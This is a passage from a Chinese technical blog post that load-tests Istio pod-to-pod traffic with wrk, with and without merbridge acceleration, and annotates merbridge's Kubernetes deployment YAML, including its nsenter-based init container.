class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.23s   671.98ms   1.82s   100.00%</span><br><span class="line">    Req/Sec    10.85      7.15    30.00     50.85%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.80s</span><br><span class="line">     75%    1.82s</span><br><span class="line">     90%    1.82s</span><br><span class="line">     99%    1.82s</span><br><span class="line">  84 requests in 10.10s, 412.15KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 80</span><br><span class="line">Requests/sec:      8.32</span><br><span class="line">Transfer/sec:     40.81KB</span><br></pre></td></tr></table></figure><h5 id="同一node下pod间发送请求"><a href="#同一node下pod间发送请求" class="headerlink" title="同一node下pod间发送请求"></a>同一node下pod间发送请求</h5><h6 id="pod内安装wrk"><a href="#pod内安装wrk" class="headerlink" title="pod内安装wrk"></a>pod内安装wrk</h6><p>进入pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it &lt;pod-name&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>安装wrk压测工具发现无法执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ $ ls</span><br><span class="line">bin            dev            etc            lib            mnt            proc           run            srv            tmp            var</span><br><span class="line">cacert.pem     entrypoint.sh  home           media          opt            root           sbin           sys            usr</span><br><span class="line">/ $ sudo</span><br><span class="line">/bin/sh: sudo: not found</span><br><span class="line">/ $ apt</span><br><span class="line">/bin/sh: apt: not found</span><br></pre></td></tr></table></figure><p>解决办法：<a href="https://stackoverflow.com/questions/45142855/bin-sh-apt-get-not-found" target="_blank" rel="noopener">https://stackoverflow.com/questions/45142855/bin-sh-apt-get-not-found</a></p><p>通过docker以root身份进入容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it --user=root &lt;CONTAINER ID&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>使用apk命令安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ # apk update</span><br><span class="line">/ # apk add Package</span><br><span class="line">这里需要安装的package如下</span><br><span class="line">- gcc</span><br><span class="line">- make</span><br><span class="line">- automake</span><br><span class="line">- autoconf</span><br><span class="line">- libtool</span><br><span class="line">- linux-headers</span><br><span class="line">- libc-dev</span><br></pre></td></tr></table></figure><p>在wrk目录下执行make</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # make</span><br></pre></td></tr></table></figure><p>在名为<code>sleep-698cfc4445-k8ncb</code>的pod下，对名为<code>helloworld-v1-fdb8c8c58-gh4sf</code>的pod发起请求。这两个pod同属于<code>192.168.19.83</code>节点，在该node下没有部署merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # wrk -c10000 --latency http://10.101.180.145:5000</span><br><span class="line">Running 10s test @ http://10.101.180.145:5000</span><br><span class="line">  2 threads and 10000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency   757.70ms  403.53ms   1.54s    51.72%</span><br><span class="line">    Req/Sec    20.85     30.78   170.00     94.87%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%  724.43ms</span><br><span class="line">     75%    1.09s</span><br><span class="line">     90%    1.31s</span><br><span class="line">     99%    1.54s</span><br><span class="line">  136 requests in 10.22s, 52.28KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 107</span><br><span class="line">  Non-2xx or 3xx responses: 136</span><br><span class="line">Requests/sec:     13.31</span><br><span class="line">Transfer/sec:      5.12KB</span><br></pre></td></tr></table></figure><p>在名为<code>sleep-698cfc4445-qncjl</code>的pod下，对名为<code>helloworld-v1-fdb8c8c58-28pm4</code>的pod发起请求。这两个pod同属于<code>192.168.19.82</code>节点，在该node部署了merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # wrk -c10000 --latency http://10.101.187.77:5000</span><br><span class="line">Running 10s test @ http://10.101.187.77:5000</span><br><span class="line">  2 threads and 10000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.91s    20.63ms   1.98s    82.22%</span><br><span class="line">    Req/Sec    78.02     96.83   495.00     86.67%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.92s</span><br><span class="line">     75%    1.92s</span><br><span class="line">     90%    1.92s</span><br><span class="line">     99%    1.98s</span><br><span class="line">  461 requests in 10.10s, 177.23KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 416</span><br><span class="line">  Non-2xx or 3xx responses: 461</span><br><span class="line">Requests/sec:     45.67</span><br><span class="line">Transfer/sec:     17.56KB</span><br></pre></td></tr></table></figure><h5 id="不同node下pod间发送请求"><a href="#不同node下pod间发送请求" class="headerlink" title="不同node下pod间发送请求"></a>不同node下pod间发送请求</h5><p>在node为<code>192.168.19.83名为sleep-698cfc4445-k8ncb</code>的pod下，对node为<code>192.168.19.85名为productpage-v1-65b75f6885-p6k2w</code>的pod发起请求。这两个pod不属于同一个node下，在该集群下没有部署merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.69s     0.00us   1.69s   100.00%</span><br><span class="line">    Req/Sec     5.98      4.32    20.00     75.47%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.69s</span><br><span class="line">     75%    1.69s</span><br><span class="line">     90%    1.69s</span><br><span class="line">     99%    1.69s</span><br><span class="line">  62 requests in 10.04s, 304.85KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 61</span><br><span class="line">Requests/sec:      6.17</span><br><span class="line">Transfer/sec:     30.35KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.82名为sleep-698cfc4445-qncjl</code>的pod下，对node为<code>192.168.19.84名为productpage-v1-65b75f6885-kt88j</code>的pod发起请求。这两个pod不属于同一个node下，在该集群下部署了merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.48s   258.10ms   1.80s    83.33%</span><br><span class="line">    Req/Sec    15.02     14.04    90.00     84.54%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.58s</span><br><span class="line">     75%    1.64s</span><br><span class="line">     90%    1.69s</span><br><span class="line">     99%    1.80s</span><br><span class="line">  188 requests in 10.08s, 0.90MB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 158</span><br><span class="line">Requests/sec:     18.66</span><br><span class="line">Transfer/sec:     91.41KB</span><br></pre></td></tr></table></figure><h5 id="拓展：从控制平面节点以外的计算机控制集群"><a href="#拓展：从控制平面节点以外的计算机控制集群" class="headerlink" title="拓展：从控制平面节点以外的计算机控制集群"></a>拓展：从控制平面节点以外的计算机控制集群</h5><p>从节点查看pod报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod</span><br><span class="line">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span><br></pre></td></tr></table></figure><p>出现这个问题的原因是kubectl命令需要使用<code>kubernetes-admin</code>来运行，解决方法如下，将主节点中的<code>/etc/kubernetes/admin.conf</code>文件拷贝到从节点相同目录下，然后配置环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# echo "export KUBECONFIG=/etc/kubernetes/admin.conf" &gt;&gt; ~/.bash_profile</span><br><span class="line">root@ubuntu:~# source ~/.bash_profile</span><br></pre></td></tr></table></figure><p>再次查看pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods</span><br><span class="line">NAME                              READY   STATUS    RESTARTS   AGE</span><br><span class="line">details-v1-5498c86cf5-bhv2h       2/2     Running   24         11d</span><br><span class="line">helloworld-v1-fdb8c8c58-9nqw8     2/2     Running   0          5d</span><br><span class="line">helloworld-v2-5b46bc9f84-gdzvl    2/2     Running   0          5d</span><br><span class="line">productpage-v1-65b75f6885-p6k2w   2/2     Running   24         11d</span><br><span class="line">ratings-v1-b477cf6cf-k84kr        2/2     Running   24         11d</span><br><span class="line">reviews-v1-79d546878f-q6f62       2/2     Running   24         11d</span><br><span class="line">reviews-v2-548c57f459-cqq2r       2/2     Running   24         11d</span><br><span class="line">reviews-v3-6dd79655b9-gr42h       2/2     Running   24         11d</span><br><span class="line">sleep-698cfc4445-8nncn            2/2     Running   0          5d1h</span><br></pre></td></tr></table></figure><h4 id="merbridge-yaml文件解析-istio"><a href="#merbridge-yaml文件解析-istio" class="headerlink" title="merbridge yaml文件解析(istio)"></a>merbridge yaml文件解析(istio)</h4><p><a href="https://github.com/merbridge/merbridge/blob/main/deploy/all-in-one.yaml" target="_blank" rel="noopener">https://github.com/merbridge/merbridge/blob/main/deploy/all-in-one.yaml</a></p><p>第一段，创建对象类别，这里是集群角色</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1 #创建该对象所使用的 Kubernetes API 的版本</span><br><span class="line">kind: ClusterRole #想要创建对象的类别</span><br><span class="line">metadata: #帮助唯一性标识对象的一些数据</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">rules:</span><br><span class="line">- apiGroups: #空字符串表明使用core API group</span><br><span class="line">  - ""</span><br><span class="line">  resources:</span><br><span class="line">  - pods</span><br><span class="line">  verbs: #对资源对象执行的操作</span><br><span class="line">  - list</span><br><span class="line">  - get</span><br><span class="line">  - watch</span><br></pre></td></tr></table></figure><p>第二段，在集群范围执行授权，这里对集群角色权限进行绑定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding #在集群范围执行授权</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">roleRef: #指定与某 Role 或 ClusterRole 的绑定关系</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole # 此字段必须是 Role 或 ClusterRole</span><br><span class="line">  name: merbridge # 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配</span><br><span class="line">subjects: #用来尝试操作集群的对象</span><br><span class="line">- kind: ServiceAccount #为Pod中的进程和外部用户提供身份信息</span><br><span class="line">  name: merbridge</span><br><span class="line">  namespace: istio-system</span><br></pre></td></tr></table></figure><p>第三段，为pod指定服务账户，命名空间为<code>istio-system</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">  namespace: istio-system</span><br></pre></td></tr></table></figure><p>第四段创建DaemonSet类型的pod。我们将内容拆为两部分说明</p><p><code>initContainers</code></p><p>首先我们看一下<code>initContainers</code>的挂载卷，需要说明的是，使用卷时, 在 <code>.spec.volumes</code> 字段中设置为 Pod 提供的卷，并在 <code>.spec.containers[*].volumeMounts</code> 字段中声明卷在容器中的挂载位置。因此我们先看一下<code>.spec.volumes</code>字段，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">volumes:</span><br><span class="line">      - hostPath: </span><br><span class="line">          path: /sys/fs</span><br><span class="line">        name: sys-fs</span><br><span class="line">      - hostPath:</span><br><span class="line">          path: /proc</span><br><span class="line">        name: host-proc</span><br><span class="line">      - emptyDir: &#123;&#125; </span><br><span class="line">        name: host-ips</span><br></pre></td></tr></table></figure><p>这里用到了两种存储卷类型，分别是<code>hostPath</code>和<code>emptyDir</code>。对于<code>hostPath</code>类型，会映射node文件系统中的文件或者目录到pod里。而对于<code>emptyDir</code>类型，K8s会在Node上自动分配一个目录，因此无需指定宿主机Node上对应的目录文件。</p><p>接着我们回到<code>initContainers</code>中。看到<code>initContainers</code>有两个<code>mountPath</code>。用到了<code>.spec.volumes</code>下的<code>host-ips</code>和<code>host-proc</code>，挂载路径为容器中的<code>/host/ips</code>和<code>/host/proc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">initContainers: #Init容器是一种特殊容器，在Pod内的应用容器启动之前运行</span><br><span class="line">      - image: ghcr.io/merbridge/merbridge:latest</span><br><span class="line">        imagePullPolicy: Always</span><br><span class="line">        name: init</span><br><span class="line">        args:</span><br><span class="line">        - sh</span><br><span class="line">        - -c</span><br><span class="line">        - nsenter --net=/host/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;' | tee /host/ips/ips.txt</span><br><span class="line">        resources: </span><br><span class="line">          requests:</span><br><span class="line">            cpu: 100m</span><br><span class="line">            memory: 50Mi</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 300m</span><br><span class="line">            memory: 50Mi</span><br><span class="line">        securityContext:</span><br><span class="line">          privileged: true</span><br><span class="line">        volumeMounts:</span><br><span class="line">          - mountPath: /host/ips </span><br><span class="line">            name: host-ips</span><br><span class="line">          - mountPath: /host/proc</span><br><span class="line">            name: host-proc</span><br></pre></td></tr></table></figure><p>挂载完成后，我们看一下执行参数。这里用到了<code>nsenter</code>命令。nsenter命令是一个可以在指定进程的命令空间下运行指定程序的命令。它位于util-linux包中。<br>具体使用可参考如下连接：<a href="https://juejin.cn/post/7038531145113452581" target="_blank" rel="noopener">https://juejin.cn/post/7038531145113452581</a><br><code>--net</code>进入<code>net</code>命令空间，并指定了文件的命令空间。<code>nsenter --net=/host/proc/1/ns/net ip -o addr</code>命令可以查看主机的ip地址信息。在主机上测试如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr</span><br><span class="line">1: lo    inet 127.0.0.1/8 scope host lo\       valid_lft forever preferred_lft forever</span><br><span class="line">1: lo    inet6 ::1/128 scope host \       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160    inet 192.168.19.84/16 brd 192.168.255.255 scope global ens160\       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160    inet6 fe80::250:56ff:fe82:8bd7/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0    inet6 fe80::42:8aff:fe54:fa57/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">4: flannel.1    inet 10.244.0.0/32 scope global flannel.1\       valid_lft forever preferred_lft forever</span><br><span class="line">4: flannel.1    inet6 fe80::e4a0:b4ff:fe2e:2c1f/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">5: cni0    inet 10.244.0.1/24 brd 10.244.0.255 scope global cni0\       valid_lft forever preferred_lft forever</span><br><span class="line">5: cni0    inet6 fe80::a4b8:52ff:fef8:6b8a/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">6: vethffb04bf6    inet6 fe80::24c6:d7ff:fe20:b8b7/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">7: vethf2b12fbf    inet6 fe80::e83b:a4ff:fe7b:7321/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">8: vethec8e53c3    inet6 fe80::d44b:31ff:fe17:a41c/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">9: vethfa223ce0    inet6 fe80::5855:4fff:feef:92f0/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">10: vethcbd6c656    inet6 fe80::c09c:62ff:fe21:df97/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">11: vethf18457c5    inet6 fe80::b8ba:35ff:fe1f:505f/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">12: veth4bbafc0f    inet6 fe80::186e:7aff:fe98:59e4/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">13: veth2757e288    inet6 fe80::4cb5:dff:fea6:d245/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">14: veth40c1c447    inet6 fe80::4468:7bff:fe40:6b09/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">15: vethc01359c4    inet6 fe80::61:aeff:fece:58ee/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">16: vethf3f6e93e    inet6 fe80::30ee:22ff:fee8:2fee/64 scope link \       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>这里有人可能会想为什么不直接使用<code>ip -o addr</code>呢，从下面结果看到这两条命令的执行结果是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br></pre></td></tr></table></figure><p>需要提一点的是，nsenter命令一个最典型的用途就是进入容器的网络命令空间。相当多的容器为了轻量级，是不包含较为基础的命令的，比如说<code>ip address</code>，<code>ping</code>，<code>telnet</code>，<code>ss</code>，<code>tcpdump</code>等等命令，这就给调试容器网络带来相当大的困扰。</p><p><code>awk &#39;{print $4}&#39;</code>，这句命令是对每行按照空格或TAB分割，输出第四项</p><p>awk用法：<a href="https://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-awk.html</a></p><p>主机测试如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br></pre></td></tr></table></figure><p>之后通过tee命令将结果写入到<code>/host/ips/ips.txt</code>中。</p><p>从这里我们就可以看到，初始化容器的作用就是获取主机的ip地址信息，并将结果存入到<code>ips.txt</code>中。 Init 容器初始化完毕后就会自动终止，但是 Init 容器初始化结果会保留到应用容器和sidecar容器中。</p><p><code>containers</code></p><p><code>containers</code>和初始化容器的镜像是相同的。<code>containers</code>中也有两个<code>mountPath</code>。用到了<code>.spec.volumes</code>下的<code>host-ips</code>和<code>sys-fs</code>，挂载路径为容器中的<code>/host/ips</code>和<code>/sys/fs</code>，通过<code>securityContext</code>定义了容器需要特权模式运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">containers:</span><br><span class="line">      - image: ghcr.io/merbridge/merbridge:latest</span><br><span class="line">        imagePullPolicy: Always</span><br><span class="line">        name: merbridge</span><br><span class="line">        args: #为容器设置启动时要执行的命令和参数</span><br><span 